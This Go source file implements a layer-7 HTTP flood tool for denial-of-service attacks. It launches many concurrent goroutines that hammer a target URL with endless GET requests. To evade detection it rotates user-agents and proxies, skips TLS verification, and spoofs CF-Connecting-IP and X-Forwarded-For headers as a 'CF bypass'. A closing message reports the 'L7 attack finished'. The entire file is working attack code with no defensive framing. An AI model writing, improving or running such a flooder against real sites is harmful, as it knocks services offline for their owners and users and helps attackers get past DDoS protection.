package l7

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
}

var proxies []string

func loadProxies(file string) {
	if file == "" {
		return
	}
	f, err := os.Open(file)
	if err != nil {
		fmt.Printf("[-] Proxy file error: %v\n", err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	fmt.Printf("[+] Loaded %d proxies for L7\n", len(proxies))
}

func getProxy() string {
	if len(proxies) == 0 {
		return ""
	}
	return proxies[rand.Intn(len(proxies))]
}

func getUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func Run(method, target, proxyFile string, threads, duration int) {
	rand.Seed(time.Now().UnixNano())
	loadProxies(proxyFile)

	var wg sync.WaitGroup
	useProxy := proxyFile != "" && len(proxies) > 0

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{
				Timeout: 10 * time.Second,
				Transport: &http.Transport{
					TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
					DisableKeepAlives: false,
				},
			}

			for {
				req, _ := http.NewRequest("GET", target, nil)
				req.Header.Set("User-Agent", getUA())
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Connection", "keep-alive")

				// dumb CF bypass
				if strings.Contains(strings.ToLower(target), "cloudflare") || method == "bypass" {
					req.Header.Set("CF-Connecting-IP", "127.0.0.1")
					req.Header.Set("X-Forwarded-For", "127.0.0.1")
				}

				if useProxy {
					p := getProxy()
					proxyURL, _ := url.Parse("http://" + p)
					client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				}

				resp, err := client.Do(req)
				if err == nil && resp != nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
				time.Sleep(8 * time.Millisecond)
			}
		}()
	}

	time.AfterFunc(time.Duration(duration)*time.Second, func() {
		fmt.Println("[+] L7 attack finished.")
		os.Exit(0)
	})

	wg.Wait()
}
